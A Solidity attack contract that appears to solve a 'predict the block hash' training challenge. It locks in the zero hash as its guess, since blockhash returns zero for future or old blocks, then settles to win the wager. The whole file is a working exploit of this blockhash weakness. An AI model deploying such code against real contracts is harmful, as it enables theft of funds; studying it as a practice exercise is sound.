pragma solidity ^0.4.21;

import "./PredictTheBlockHashChallenge.sol";

contract Attack {

    PredictTheBlockHashChallenge target;

    function Attack(address _targetAddress) public payable {
        target = PredictTheBlockHashChallenge(_targetAddress);
    }

    function lockInGuess() external payable {
        uint256 settlementBlockNumber = block.number + 1;
        bytes32 answer = block.blockhash(settlementBlockNumber);
        target.lockInGuess.value(1 ether)(answer);
    }
    
    function _attack() external payable {
        target.settle();
        require(target.isComplete());
    }

    function() public payable {}
}